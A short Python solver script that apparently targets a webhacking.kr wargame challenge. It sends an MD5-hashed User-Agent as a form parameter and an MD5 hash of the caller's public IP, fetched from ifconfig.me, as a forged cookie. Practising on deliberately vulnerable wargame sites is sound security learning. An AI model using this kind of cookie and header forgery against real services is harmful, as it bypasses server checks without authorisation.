import requests, hashlib

url = 'http://webhacking.kr/challenge/bonus/bonus-6/gpcc.php'
url_ip = 'http://ifconfig.me'
cookies = {
	'PHPSESSID': '',
	'test': ''
}
params = {
	'kk': ''
}
headers = {
	'User-Agent': ''
}

headers['User-Agent'] = 'R4k4'
m = hashlib.md5()
m.update(headers['User-Agent'].encode('ascii'))
params['kk'] = m.hexdigest()

res = requests.get(url_ip)
my_ip = res.text.lstrip().rstrip()
print('My IP :', my_ip)
m = hashlib.md5()
m.update(my_ip.encode('ascii'))
cookies['test'] = m.hexdigest()

res = requests.post(url, cookies=cookies, data=params, headers=headers)
print(res.text)